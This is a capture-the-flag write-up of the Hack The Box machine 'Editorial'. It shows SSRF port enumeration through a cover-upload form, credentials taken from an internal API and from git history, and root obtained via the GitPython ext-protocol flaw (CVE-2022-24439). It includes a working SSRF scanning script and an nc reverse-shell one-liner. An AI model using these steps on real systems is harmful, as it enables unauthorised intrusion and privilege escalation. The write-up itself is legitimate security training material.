# Key Takeaways
- Keep it simple and don't make assumptions... if something smells like SSRF, then enumerate localhost! (user.txt)
- Nginx does not allow code execution by default... don't tunnel vision on code execution even if file upload is possible (user.txt)
- Go to the documentation ASAP (root.txt)

# Editorial Overview
- Platform: Linux
- HTB Rating: Easy - Not Too Easy

### Vulnerabilities
- The web application allows arbitrary file upload due to having no extension, content, or mime type validation.
- The web application returns the file path of the uploaded file to the user, facilitating possible exploitation attempts.
- The web application allows Server-Side Request Forgery (SSRF) due to a lack of sanitization and validation on user input into the publishing form.
- Static passwords are hard-coded and further re-used for login to SSH.
- Outdated python libraries alongside excessive privileges given to a python script created a privilege escalation vector.

### Strengths
- Nginx was used without any file execution capability, rendering any uploaded files only able to be served statically and preventing easy code execution.
- File uploads were assigned a random 32 character ID, making it almost impossible to determine the filename without it being returned to the user.
- Absolute paths used in the sudo command prevent quick privilege escalation via PATH manipulation.

# Solving user.txt
As we are starting off this machine with no information, I began with the typical nmap scans. We are given a pretty common setup, seeing SSH open and a single webserver on port 80.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

As the webserver seemed like the better initial target, I opened up Burp Suite alongside firefox and began seeing what it would have for us. Due to an initial error when accessing the webserver over just the IP, I first added `editorial.htb` into my /etc/hosts file, allowing us to access the site.

While poking around the website, I ran a number of directory and file brute forcing lists using `ffuf`, but none of these turned up anything useful. On the website itself, I was immediately drawn to the `/upload` page which gave us two extremely interesting options— submit a URL or upload a file. I then further looked at the page source, noting an interesting script related to this functionality:
```javascript
<script>
  document.getElementById('button-cover').addEventListener('click', function(e) {
    e.preventDefault();
    var formData = new FormData(document.getElementById('form-cover'));
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/upload-cover');
    xhr.onload = function() {
      if (xhr.status === 200) {
        var imgUrl = xhr.responseText;
        console.log(imgUrl);
        document.getElementById('bookcover').src = imgUrl;

        document.getElementById('bookfile').value = '';
        document.getElementById('bookurl').value = '';
      }
    };
    xhr.send(formData);
  });
</script>
```

Taking note that this script was printing the uploaded file path to the console as well initiating the request upon clicking "Preview", this sent me looking for a file upload vulnerability. Interestingly, this app makes great use a best practice in mitigating file upload vulnerabilities— it is changing the filename to a long, random ID upon upload. This however is obviously counteracted by the fact that it then displays the path and new name directly to the user in the dev console and web response.
<img width="772" height="264" alt="image" src="https://github.com/user-attachments/assets/226874b3-bfd5-4590-8f02-bff5efd9f568" />

_Burp Suite request/response showing the new filename returned to the user_


I overcommitted to this path a bit too long. Due to the server returning the filepath alongside a lack of _any_ file type filters, this initially felt like a very strong point of entry that could lead to RCE. However, I eventually realized that the `/static/uploads` folder would not execute code. I later confirmed that the Nginx server was being used as a simple proxy and was not routing any files to an interpreter. This alongside the flask app itself having no way to execute the files meant that code execution from arbitrary file upload in this way would be a dead end.

I then looked toward the URL submission parameter, as anything that is accepting URLs without filtering screams Server Side Request Forgery (SSRF). While it definitely smelled like SSRF, I was initially tripped up by the fact that requests to `http://localhost` would simply time out, and didn't _seem_ to return any data. After playing with requests to `/upload-cover` in Burp Suite, I eventually realized that it WAS returning data, as it would save the contents of the original request and then make a second request to display that content. This was later confirmed via the python code from the app itself below.
```python
# If cover comes from an URL
if url_bookcover:
    try: # Set default cover if exists a connection problem
        r = requests.get(url_bookcover, timeout=1)
    except:
        return default_cover

    # Save the response to the request in a file
    with open(app.config['UPLOAD_FOLDER'] + uuid_filename_cover, 'wb') as file_url_bookcover:
        file_url_bookcover.write(r.content)
```

While requests to `http://localhost` would time out, requests to `http://localhost:81` would not, making me feel that there also was not any weird localhost filtering going on. Armed with this knowledge, I crafted a basic Python script that would make a web request to `/upload-cover`, enumerating all localhost ports and returning the port number if it either timed out or returned a valid file. Note that the request parameters were pasted from Burp Suite using the "Copy As Python-Requests" extension.
```python
import requests

for port in range(1,65535):
    burp0_url = "http://editorial.htb:80/upload-cover"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://editorial.htb/upload", "Content-Type": "multipart/form-data; boundary=---------------------------42548592657882719163591992974", "Origin": "http://editorial.htb", "DNT": "1", "Connection": "keep-alive", "Priority": "u=0"}
    burp0_data = f"-----------------------------42548592657882719163591992974\r\nContent-Disposition: form-data; name=\"bookurl\"\r\n\r\nhttp://localhost:{port}\r\n-----------------------------42548592657882719163591992974\r\nContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------42548592657882719163591992974--\r\n"
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=3)
        if 'static/uploads' in r.text:
            print(f'Something on port {port} -- returned data')
    except requests.exceptions.Timeout:
        print(f'Something on port {port}')
```

Using this script, I found that there seemed to be a service running on localhost:5000. I sent a request to `/upload-cover` with `http://localhost:5000` as the bookurl and then intercepted the subsequent request/response to `http://editorial.htb/static/uploads/<file-id>` with Burp Proxy.
```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://editorial.htb/upload
Content-Type: multipart/form-data; boundary=---------------------------18058011123166126201882229252
Content-Length: 361
Origin: http://editorial.htb
DNT: 1
Connection: keep-alive
Priority: u=0

-----------------------------18058011123166126201882229252
Content-Disposition: form-data; name="bookurl"

http://localhost:5000
-----------------------------18058011123166126201882229252
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------18058011123166126201882229252--
```
_Burp request to /upload-cover with bookurl pointing to `http://localhost:5000`_

This response from the server shows successful SSRF, and seems to contain some API documentation.
```json
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

I then continued attempting requests using the listed endpoints, eventually finding credentials when making a request to `http://localhost:5000/api/latest/metadata/messages/authors`.
<img width="1122" height="380" alt="image" src="https://github.com/user-attachments/assets/7d535b01-f399-4baf-abf3-ea4b4f9d8390" />
_Burp request with credentials returned from the endpoint_

Remembering that SSH was available, I then successfully logged into the machine via the `dev` user and retrieved the user.txt flag.

# Solving root.txt
Once connected to the machine, I ran a couple of prelimary commands to look for easy privilege escalation methods (sudo, suid, id, groups, etc.). As nothing useful immediately turned up, I then noted that there was one other user on the system named `prod`. Considering the relationship between dev and prod, I figured it was likely that we would need to first escalate to this other user before gaining root access.

Looking into the `~/apps` folder in the `dev` user's home directory reveals a .git folder. The config file and descriptions didn't yield anything helpful, however there did happen to be some log files with an interesting commit history in `~/apps/.git/logs/HEAD`.
```
0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500     commit (initial): feat: create editorial app
3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500     commit: feat: create api to editorial info
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500   
 commit: change(api): downgrading prod to dev
b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500     commit: change: remove debug and update api port
dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500     commit: fix: bugfix in api port endpoint
```

Noting the 3rd commit, viewing the changes made to downgrade from prod to dev would be extremely interesting to us, especially since we initally got our credentials from a message that was embedded in the code. I read what code changes were made between the initialization of the app and the downgrade to prod via a git diff:
```
git diff 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28
```

As expected, this revealed credentials for the `prod` user account.
<img width="1269" height="363" alt="image" src="https://github.com/user-attachments/assets/f597fc64-c290-4148-b7ae-26857dadcf3a" />

I then used SSH to log into the `prod` account. I did some initial checks again, and quickly found that this account has access to single command with root privileges via `sudo -l`.
We are able to run: `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *`

The use of absolute paths here is stronger for security than relative paths, so I decided to first inspect this python file and see what it is doing.
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

It looks like this code is using python to clone a git reposity from a remote location of our choosing to the 'new_changes' directory. Without knowing much about this function, the `-c protocol.ext.allow=always' looks a bit odd, and potentially insecure. I threw that string into Google to see what would turn up. This brought me to a page for CVE-2022-24439, a vulnerability in GitPython, conveniently when the 'ext' transport protocol is allowed.

Initially, I found another page that had an example of how to exploit this vulnerability [here](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858). However, since I didn't actually understand the syntax necessary to make it work, I wasted a bit of time trying to open a root shell.

Finally (as I should have done initially) I opened the [git-remote-ext documentation](https://git-scm.com/docs/git-remote-ext) and immediately found that % was used to input a literal space into the arguments. After this, I opened a reverse root shell with the following command.
```sh
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c mkfifo% /tmp/f;% nc% <IP>% <PORT>% <% /tmp/f% |% /bin/sh% >/tmp/f% 2>&1;% rm% /tmp/f"
```

Then I made my way to the `/root` directory and grabbed root.txt.
